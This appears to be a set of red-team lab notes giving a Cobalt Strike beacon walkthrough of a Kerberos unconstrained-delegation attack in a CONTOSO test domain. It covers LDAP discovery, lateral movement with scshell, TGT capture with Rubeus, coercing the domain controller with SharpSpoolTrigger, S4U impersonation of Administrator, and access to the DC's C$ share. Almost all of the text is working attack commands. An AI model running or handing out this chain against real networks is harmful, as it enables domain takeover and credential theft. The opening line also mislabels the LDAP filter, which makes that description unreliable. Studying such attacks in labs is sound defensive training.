use LDAP to find users with unconstrained delegation (where the AllowedToDelegateTo attribute is not null)
    beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

we see that lon-ws-1$ has unconstrained delegation

move laterally to the web server
    steal token from rsteel
    beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
    beacon> jump scshell64 lon-ws-1 smb

now interact with the web server beacon 
    beacon> spawnto x64 %windir%\sysnative\werfault.exe

now monitor via rubeus
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap

now force the computer auth
    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

store the ticket via Powershell one-liner
    powershell> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\tgt.kirbi", [Convert]::FromBase64String("[ticket]"))

kill rubeus monitor
    beacon> jobkill 0

computers dont get access the way users do, so now use krb_s4u to get a usable service ticket as our desired user
    beacon> krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator

now we store the returned ticket and inspect
    beacon> krb_describe /ticket:[TGT]

now let's import the ticket! 
    beacon> make_token CONTOSO\Administrator FakePass
    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\tgt.kirbi

now we can access the DC!
    beacon> ls \\lon-dc-1\c$